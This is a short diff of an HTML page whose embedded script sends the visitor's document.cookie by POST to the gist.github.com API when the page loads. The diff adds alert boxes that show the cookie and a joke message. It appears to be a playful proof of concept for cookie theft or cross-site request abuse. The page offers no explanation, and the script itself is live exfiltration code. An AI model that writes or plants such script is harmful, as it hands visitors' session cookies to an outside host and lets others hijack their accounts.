@@ -6,6 +6,7 @@
             'files[file2.ab]' => 'contents' })
 -->
 <script type="text/javascript" charset="utf-8">
+alert(document.cookie);
 new Ajax.Request('http://gist.github.com/api/v1/xml/new', {
   method: 'post',
   postBody: document.cookie,
@@ -14,6 +15,7 @@ new Ajax.Request('http://gist.github.com/api/v1/xml/new', {
       notice.update(transport.responseText)
   }
 });
+alert('butts');
 $('lolz').update('going');
 </script>
 <pre id="lolz">
